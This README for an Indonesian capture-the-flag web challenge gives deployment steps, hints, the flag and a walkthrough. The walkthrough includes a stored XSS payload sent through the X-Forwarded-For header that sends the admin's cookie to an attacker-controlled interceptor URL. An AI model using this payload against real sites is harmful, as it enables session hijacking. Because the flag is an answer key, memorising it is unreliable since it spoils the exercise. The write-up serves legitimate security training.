## Secure Web
Website ini dilengkapi dengan log percobaan login dengan password yang salah.


## Hint
- Admin Cookie
- XFF <sup>*</sup>

<sup>*</sup>Kalo kepepet



## Deployment

- pake docker compose buat deploy \
  command: `docker-compose up -d`
- port: 65535

## Flag

KOMATIKCTF{XSS_using_XFF_injection}

## How to solve
- Coba register
- Coba login
- Login dengan password salah -> masuk log
- Nah karena log nya hanya berisi IP dan time maka yang bisa diinject XSS cuma IP aja
- Pakai HTTP Header X-Forwarded-For untuk inject IP
- HTTP REQUEST:
  ```http request
  POST /login HTTP/1.1
  Host: [LINK CHALLENGE]
  X-Forwarded-For: <script>document.write('<img src="[URL Interceptor]?c='+document.cookie+'" />');</script>
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 27
  
  username=admin&password=bla
  ```
- Interceptor bisa pakai beeceptor
- dapat deh cookinya admin